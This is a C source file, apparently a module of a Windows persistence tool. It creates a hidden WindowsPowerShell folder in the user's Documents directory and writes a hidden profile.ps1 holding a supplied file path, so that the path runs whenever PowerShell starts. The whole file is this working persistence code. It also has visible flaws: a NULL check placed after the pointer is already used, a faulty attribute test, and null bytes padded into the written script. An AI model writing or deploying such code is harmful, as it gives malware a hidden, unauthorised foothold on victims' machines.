#include "persys.h"

wchar_t* CheckPowershellDir(void)
{
	wchar_t* ppszPath;
	wchar_t* powershelldir;
	DWORD dwAttrib;

	if ((powershelldir = malloc((MAX_PATH + 1) * sizeof(wchar_t))) == NULL)
		return (NULL);
	if (SUCCEEDED(SHGetKnownFolderPath(&FOLDERID_Documents, 0, 0, &ppszPath)))
	{
		printf("	[+] Checking the 'windowspowershell' folder.\n");
		wmemset(powershelldir, 0, (MAX_PATH + 1));
		wcscat(powershelldir, ppszPath);
		wcscat(powershelldir, L"\\windowspowershell");
		dwAttrib = GetFileAttributesW(powershelldir);
		if (dwAttrib != FILE_ATTRIBUTE_DIRECTORY)
		{
			if (CreateDirectoryW(powershelldir, NULL))
			{
				SetFileAttributesW(powershelldir, FILE_ATTRIBUTE_HIDDEN);
				wprintf(L"		[i] WindowsPowershell directory not found.\n"\
					L"		[i] Creating the hidden folder %ls\n", powershelldir);
				return (powershelldir);
			}
			else if (GetLastError() == ERROR_ALREADY_EXISTS)
			{
				printf("		[i] WindowsPowershell directory already exists.\n");
				return (powershelldir);
			}
			else
				fprintf(stderr, "Error : WindowsPowershell directory could not be created.\n");
			return NULL;
		}
		else
		{
			printf("		[i] WindowsPowershell directory found !\n");
			return (powershelldir);
		}
	}
	else
		fprintf(stderr, "Error : Documents folder could not be retrieved.\n");
	return NULL;
}

void	CreateProfile(S_args* params, wchar_t* powershelldir)
{
	HANDLE	h;
	wchar_t profile[MAX_PATH];
	char* mbstr;
	DWORD lpNumberOfBytesWritten = 0;

	wmemset(profile, 0, MAX_PATH);
	wcscat(profile, powershelldir);
	wcscat(profile, L"\\profile.ps1");
	if (powershelldir)
	{
		h = CreateFileW(profile, GENERIC_WRITE,
			0, NULL, 1, FILE_ATTRIBUTE_HIDDEN, NULL);
		if (h == INVALID_HANDLE_VALUE)
		{
			if (GetLastError() == ERROR_FILE_EXISTS)
				fprintf(stderr, "Error : A PowerShell profile already exists.\n");
			else
				fprintf(stderr, "Error : could not create a Powershell profile.\n");
		}
		else
		{
			mbstr = malloc((MAX_PATH + 1) * sizeof(char));
			if (mbstr)
			{
				memset(mbstr, 0, (MAX_PATH + 1));
				wcstombs(mbstr, params->filePath, (MAX_PATH + 1));
				if (WriteFile(h, mbstr, (MAX_PATH + 1),
					&lpNumberOfBytesWritten, NULL))
					printf("		[i] Powershell profile successfully created.\n");
				else
					fprintf(stderr, "Error : could not write to the Powershell profile.\n");
				free(mbstr);
			}
			else
				fprintf(stderr, "Error : Memory allocation.\n");
			CloseHandle(h);
		}
		free(powershelldir);
	}
}

void	PsProfile(S_args* params)
{
	printf("\n[*] Starting PS Profile module...\n");
	CreateProfile(params, CheckPowershellDir());
}